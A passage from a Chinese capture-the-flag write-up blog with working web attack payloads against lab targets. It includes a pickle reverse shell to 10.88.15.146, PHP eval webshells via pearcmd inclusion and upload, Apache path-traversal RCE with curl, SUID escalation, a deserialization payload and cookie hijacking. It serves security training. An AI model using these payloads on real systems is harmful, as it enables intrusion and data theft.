class="line">opcode=<span class="string">b&#x27;&#x27;&#x27;cos</span></span><br><span class="line"><span class="string">system</span></span><br><span class="line"><span class="string">(S&quot;bash -c &#x27;bash -i &gt;&amp; /dev/tcp/10.88.15.146/6666 0&gt;&amp;1&#x27;&quot;</span></span><br><span class="line"><span class="string">tR.</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(base64.b64encode(opcode))</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>刚好payload里面有个<code>+</code>，忘记编码了emm</p><h2 id="4-复盘"><a href="#4-复盘" class="headerlink" title="4-复盘"></a>4-复盘</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">require_once</span> <span class="string">&#x27;inc/header.php&#x27;</span>; <span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">require_once</span> <span class="string">&#x27;inc/sidebar.php&#x27;</span>; <span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">  &lt;!-- Content Wrapper. Contains page content --&gt;</span><br><span class="line"></span><br><span class="line">  <span class="meta">&lt;?php</span> </span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>])) &#123;</span><br><span class="line">          <span class="variable">$page</span> =<span class="string">&#x27;pages/&#x27;</span> .<span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>].<span class="string">&#x27;.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">          <span class="variable">$page</span> = <span class="string">&#x27;pages/dashboard.php&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(<span class="variable">$page</span>)) &#123;</span><br><span class="line">          <span class="keyword">require_once</span> <span class="variable">$page</span>; </span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">          <span class="keyword">require_once</span> <span class="string">&#x27;pages/error_page.php&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"> <span class="meta">?&gt;</span></span><br><span class="line">  &lt;!-- Control Sidebar --&gt;</span><br><span class="line">  &lt;aside <span class="class"><span class="keyword">class</span>=&quot;<span class="title">control</span>-<span class="title">sidebar</span> <span class="title">control</span>-<span class="title">sidebar</span>-<span class="title">dark</span>&quot;&gt;</span></span><br><span class="line"><span class="class">    &lt;!-- <span class="title">Control</span> <span class="title">sidebar</span> <span class="title">content</span> <span class="title">goes</span> <span class="title">here</span> --&gt;</span></span><br><span class="line"><span class="class">  &lt;/<span class="title">aside</span>&gt;</span></span><br><span class="line"><span class="class">  &lt;!-- /.<span class="title">control</span>-<span class="title">sidebar</span> --&gt;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class"> &lt;?<span class="title">php</span> <span class="title">require_once</span> &#x27;<span class="title">inc</span>/<span class="title">footer</span>.<span class="title">php</span>&#x27;; ?&gt;</span></span><br></pre></td></tr></table></figure><p>文件包含，可以打pearcmd</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/index.php?+config-create+/&amp;page=../../../../../usr/local/lib/php/pearcmd&amp;/&lt;?=@eval($_POST[&#x27;cmd&#x27;]);?&gt;+shell.php</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>98673582-3f7d-4462-a0c7-83e1528d147c.node5.buuoj.cn:81</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://98673582-3f7d-4462-a0c7-83e1528d147c.node5.buuoj.cn:81/login.php</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>PHPSESSID=cq0044fmuc7eqlfr48duuljvl9</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9,en;q=0.8,zh-TW;q=0.7</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>权限不够看flag，<code>suid</code>提权</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">find / -user root -perm -4000 -<span class="built_in">print</span> 2&gt;/dev/null</span><br><span class="line"></span><br><span class="line">gzip -f /flag -t  </span><br></pre></td></tr></table></figure><h2 id="Give-me-your-photo-PLZ"><a href="#Give-me-your-photo-PLZ" class="headerlink" title="Give me your photo PLZ"></a>Give me your photo PLZ</h2><p><a href="https://www.cnblogs.com/unknown404/p/10176272.html">https://www.cnblogs.com/unknown404/p/10176272.html</a> apache解析漏洞</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>dd6c1238-82ca-4a3b-b0c3-5aee6d57e2d5.node5.buuoj.cn:81</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://dd6c1238-82ca-4a3b-b0c3-5aee6d57e2d5.node5.buuoj.cn:81/</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9,en;q=0.8,zh-TW;q=0.7</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://dd6c1238-82ca-4a3b-b0c3-5aee6d57e2d5.node5.buuoj.cn:81</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>multipart/form-data; boundary=----WebKitFormBoundarylzTW48ByROVxArdw</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>318</span><br><span class="line"></span><br><span class="line"><span class="language-php">------WebKitFormBoundarylzTW48ByROVxArdw</span></span><br><span class="line"><span class="language-php">Content-Disposition: form-data; name=<span class="string">&quot;file&quot;</span>; filename=<span class="string">&quot;1.php.aaa&quot;</span></span></span><br><span class="line"><span class="language-php">Content-Type: application/octet-stream</span></span><br><span class="line"><span class="language-php"></span></span><br><span class="line"><span class="language-php"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="number">1</span>]);</span></span><br><span class="line"><span class="language-php">------WebKitFormBoundarylzTW48ByROVxArdw</span></span><br><span class="line"><span class="language-php">Content-Disposition: form-data; name=<span class="string">&quot;submit&quot;</span></span></span><br><span class="line"><span class="language-php"></span></span><br><span class="line"><span class="language-php">提交</span></span><br><span class="line"><span class="language-php">------WebKitFormBoundarylzTW48ByROVxArdw--</span></span><br><span class="line"><span class="language-php"></span></span><br></pre></td></tr></table></figure><h2 id="Unsafe-Apache"><a href="#Unsafe-Apache" class="headerlink" title="Unsafe Apache"></a>Unsafe Apache</h2><p><a href="https://blog.csdn.net/qq_60905276/article/details/125163219">https://blog.csdn.net/qq_60905276/article/details/125163219</a></p><p>这个洞我上个月实习的时候还刚好打过</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">curl --data <span class="string">&quot;echo;ls /&quot;</span> http://node5.buuoj.cn:27486/cgi-bin/.%%32e/.%%32e/.%%32e/.%%32e/bin/sh</span><br><span class="line"></span><br><span class="line">curl --data <span class="string">&quot;echo;tac /ffffllllaaagggg_cc084c485d&quot;</span> http://node5.buuoj.cn:27486/cgi-bin/.%%32e/.%%32e/.%%32e/.%%32e/bin/sh</span><br></pre></td></tr></table></figure><h2 id="So-Baby-RCE-Again"><a href="#So-Baby-RCE-Again" class="headerlink" title="So Baby RCE Again"></a>So Baby RCE Again</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&quot;cmd&quot;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/bash|curl/i&#x27;</span>,<span class="variable">$_GET</span>[<span class="string">&quot;cmd&quot;</span>]))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Hacker!&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">shell_exec</span>(<span class="variable">$_GET</span>[<span class="string">&quot;cmd&quot;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以写入文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">?cmd=echo PD9waHAgQGV2YWwoJF9QT1NUWzFdKTs= | base64 -d &gt; shell.php</span><br><span class="line"></span><br><span class="line">find / -user root -perm -4000 -print 2&gt;/dev/null</span><br><span class="line"></span><br><span class="line">date -f /ffll444aaggg</span><br></pre></td></tr></table></figure><h2 id="Include-🍐"><a href="#Include-🍐" class="headerlink" title="Include 🍐"></a>Include 🍐</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>])) &#123;</span><br><span class="line">        <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/flag|log|session|filter|input|data/i&#x27;</span>, <span class="variable">$file</span>)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;hacker!&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$file</span>.<span class="string">&quot;.php&quot;</span>);</span><br><span class="line">        <span class="comment"># Something in phpinfo.php!</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/index.php?+config-create+/&amp;file=../../../../../usr/local/lib/php/pearcmd&amp;/&lt;?=@eval($_POST[&#x27;cmd&#x27;]);?&gt;+shell.php</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>5bf9eaae-1dcb-43a5-a6c8-895d94e8e9c1.node5.buuoj.cn:81</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://5bf9eaae-1dcb-43a5-a6c8-895d94e8e9c1.node5.buuoj.cn:81/login.php</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>PHPSESSID=cq0044fmuc7eqlfr48duuljvl9</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9,en;q=0.8,zh-TW;q=0.7</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>一样的</p><h2 id="R-C-E-2"><a href="#R-C-E-2" class="headerlink" title="R!!!C!!!E!!!"></a>R!!!C!!!E!!!</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">minipop</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$code</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$qwejaskdjnlka</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\\$|\.|\!|\@|\#|\%|\^|\&amp;|\*|\?|\&#123;|\&#125;|\&gt;|\&lt;|nc|tee|wget|exec|bash|sh|netcat|grep|base64|rev|curl|wget|gcc|php|python|pingtouch|mv|mkdir|cp/i&#x27;</span>, <span class="variable">$this</span>-&gt;code))&#123;</span><br><span class="line">            <span class="title function_ invoke__">exec</span>(<span class="variable">$this</span>-&gt;code);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;alright&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;qwejaskdjnlka;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;payload&#x27;</span>]))&#123;</span><br><span class="line">    <span class="comment">//wanna try?</span></span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;payload&#x27;</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>没有链子，就是直线</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">minipop::__destruct-&gt;minipop::__toString()</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">minipop</span></span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="comment">//    public $code=&quot;ls / | t&#x27;&#x27;ee 1&quot;;</span></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$code</span>=<span class="string">&quot;tac /flag_is_h3eeere | t&#x27;&#x27;ee 1&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$qwejaskdjnlka</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title function_ invoke__">minipop</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable">$b</span>= <span class="keyword">new</span> <span class="title function_ invoke__">minipop</span>();</span><br><span class="line"><span class="variable">$b</span>-&gt;qwejaskdjnlka=<span class="variable">$a</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$b</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="WebShell的利用"><a href="#WebShell的利用" class="headerlink" title="WebShell的利用"></a>WebShell的利用</h2><p>解出来是这个</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);(<span class="variable">$_GET</span>[<span class="string">&#x27;7d67973a&#x27;</span>])(<span class="variable">$_POST</span>[<span class="string">&#x27;9fa3&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="NextDrive"><a href="#NextDrive" class="headerlink" title="NextDrive"></a>NextDrive</h2><p>注册登录之后发现<code>test.res.http</code></p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">HTTP/1.1</span> <span class="number">200</span> OK</span><br><span class="line"><span class="attribute">content-type</span><span class="punctuation">: </span>application/json; charset=utf-8</span><br><span class="line"><span class="attribute">content-length</span><span class="punctuation">: </span>50</span><br><span class="line"><span class="attribute">date</span><span class="punctuation">: </span>Tue, 06 Oct 2023 13:39:21 GMT</span><br><span class="line"><span class="attribute">connection</span><span class="punctuation">: </span>keep-alive</span><br><span class="line"><span class="attribute">keep-alive</span><span class="punctuation">: </span>timeout=5</span><br><span class="line"></span><br><span class="line"><span class="language-clojure">&#123;<span class="string">&quot;code&quot;</span>:<span class="number">0</span><span class="punctuation">,</span><span class="string">&quot;msg&quot;</span>:<span class="string">&quot;success&quot;</span><span class="punctuation">,</span><span class="string">&quot;logged&quot;</span><span class="symbol">:true</span><span class="punctuation">,</span><span class="string">&quot;data&quot;</span>:[&#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;すずめ feat.十明 - RADWIMPS,十明.flac&quot;</span><span class="punctuation">,</span><span class="string">&quot;hash&quot;</span>:<span class="string">&quot;5da3818f2b481c261749c7e1e4042d4e545c1676752d6f209f2e7f4b0b5fd0cc&quot;</span><span class="punctuation">,</span><span class="string">&quot;size&quot;</span>:<span class="number">27471829</span><span class="punctuation">,</span><span class="string">&quot;uploader&quot;</span>:<span class="string">&quot;admin&quot;</span><span class="punctuation">,</span><span class="string">&quot;uploader_uid&quot;</span>:<span class="string">&quot;100000&quot;</span><span class="punctuation">,</span><span class="string">&quot;shareTime&quot;</span>:<span class="number">1754741179527</span><span class="punctuation">,</span><span class="string">&quot;isYours&quot;</span><span class="symbol">:true</span><span class="punctuation">,</span><span class="string">&quot;isOwn&quot;</span><span class="symbol">:true</span><span class="punctuation">,</span><span class="string">&quot;ownFn&quot;</span>:<span class="string">&quot;すずめ feat.十明 - RADWIMPS,十明.flac&quot;</span>&#125;<span class="punctuation">,</span>&#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;Windows 12 Concept.png&quot;</span><span class="punctuation">,</span><span class="string">&quot;hash&quot;</span>:<span class="string">&quot;469db0f38ca0c07c3c8726c516e0f967fa662bfb6944a19cf4c617b1aba78900&quot;</span><span class="punctuation">,</span><span class="string">&quot;size&quot;</span>:<span class="number">440707</span><span class="punctuation">,</span><span class="string">&quot;uploader&quot;</span>:<span class="string">&quot;admin&quot;</span><span class="punctuation">,</span><span class="string">&quot;uploader_uid&quot;</span>:<span class="string">&quot;100000&quot;</span><span class="punctuation">,</span><span class="string">&quot;shareTime&quot;</span>:<span class="number">1754741180080</span><span class="punctuation">,</span><span class="string">&quot;isYours&quot;</span><span class="symbol">:true</span><span class="punctuation">,</span><span class="string">&quot;isOwn&quot;</span><span class="symbol">:true</span><span class="punctuation">,</span><span class="string">&quot;ownFn&quot;</span>:<span class="string">&quot;Windows 12 Concept.png&quot;</span>&#125;<span class="punctuation">,</span>&#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;信息安全技术信息安全事件分类分级指南.pdf&quot;</span><span class="punctuation">,</span><span class="string">&quot;hash&quot;</span>:<span class="string">&quot;03dff115bc0d6907752796fc808fe2ef0b4ea9049b5a92859fd7017d4e96c08f&quot;</span><span class="punctuation">,</span><span class="string">&quot;size&quot;</span>:<span class="number">330767</span><span class="punctuation">,</span><span class="string">&quot;uploader&quot;</span>:<span class="string">&quot;admin&quot;</span><span class="punctuation">,</span><span class="string">&quot;uploader_uid&quot;</span>:<span class="string">&quot;100000&quot;</span><span class="punctuation">,</span><span class="string">&quot;shareTime&quot;</span>:<span class="number">1754741180106</span><span class="punctuation">,</span><span class="string">&quot;isYours&quot;</span><span class="symbol">:true</span><span class="punctuation">,</span><span class="string">&quot;isOwn&quot;</span><span class="symbol">:true</span><span class="punctuation">,</span><span class="string">&quot;ownFn&quot;</span>:<span class="string">&quot;信息安全技术信息安全事件分类分级指南.pdf&quot;</span>&#125;<span class="punctuation">,</span>&#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;不限速，就是快！.jpg&quot;</span><span class="punctuation">,</span><span class="string">&quot;hash&quot;</span>:<span class="string">&quot;2de8696b9047f5cf270f77f4f00756be985ebc4783f3c553a77c20756bc68f2e&quot;</span><span class="punctuation">,</span><span class="string">&quot;size&quot;</span>:<span class="number">32920</span><span class="punctuation">,</span><span class="string">&quot;uploader&quot;</span>:<span class="string">&quot;admin&quot;</span><span class="punctuation">,</span><span class="string">&quot;uploader_uid&quot;</span>:<span class="string">&quot;100000&quot;</span><span class="punctuation">,</span><span class="string">&quot;shareTime&quot;</span>:<span class="number">1754741180130</span><span class="punctuation">,</span><span class="string">&quot;isYours&quot;</span><span class="symbol">:true</span><span class="punctuation">,</span><span class="string">&quot;isOwn&quot;</span><span class="symbol">:true</span><span class="punctuation">,</span><span class="string">&quot;ownFn&quot;</span>:<span class="string">&quot;不限速，就是快！.jpg&quot;</span>&#125;<span class="punctuation">,</span>&#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;test.req.http&quot;</span><span class="punctuation">,</span><span class="string">&quot;hash&quot;</span>:<span class="string">&quot;0afd24e3125c5866624e04b36fbcf393ec18bbcdc112178562b1ce505594f9b6&quot;</span><span class="punctuation">,</span><span class="string">&quot;size&quot;</span>:<span class="number">1085</span><span class="punctuation">,</span><span class="string">&quot;uploader&quot;</span>:<span class="string">&quot;admin&quot;</span><span class="punctuation">,</span><span class="string">&quot;uploader_uid&quot;</span>:<span class="string">&quot;100000&quot;</span><span class="punctuation">,</span><span class="string">&quot;shareTime&quot;</span>:<span class="number">1754741180918</span><span class="punctuation">,</span><span class="string">&quot;isYours&quot;</span><span class="symbol">:true</span><span class="punctuation">,</span><span class="string">&quot;isOwn&quot;</span><span class="symbol">:true</span><span class="punctuation">,</span><span class="string">&quot;ownFn&quot;</span>:<span class="string">&quot;test.req.http&quot;</span>&#125;]&#125;</span></span><br></pre></td></tr></table></figure><p>搞了半天真是姐姐哇断奶了，秒传是因为hash一样所以造成的漏洞，如果我们用之前的重复文件的hash就再下载就可以得到admin的Cookie从而实现越权</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/api/action/drive/upload/check</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>node5.buuoj.cn:27640</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/json</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://node5.buuoj.cn:27640</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://node5.buuoj.cn:27640/myresources</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9,en;q=0.8,zh-TW;q=0.7</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>uid=100001; token=eyJ1c2VybmFtZSI6ImJhb3pvbmd3aSIsInVpZCI6IjEwMDAwMSIsInRva2VuIjoiMmYzNDI1MzM4ZDExNGE3MzgzMzMzZDUzMDU1MDQ0ZDY0MzBlZmNmYTU5YTk1MjI2NjMzNmM5ZjBmODhlMjNjYiJ9LkEmUR1nHmZRTwx4LFELDkM.FG8wSkFdBGoJCQZ/BVtUQkFhN0kVAFZpDloAfVVbUBcWbGQdEFsBP18KUX5RCwQQF2k2H0wNUW8CBQJ7DAtUQhRhYR1BCgVvAwVXeQMFURsTb2BAQwhWOF0OVy0BCAQSHD1iQEQKUT4OWFsvBwsEQEFsaxsSWVE4XV8GLlYOB0A</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 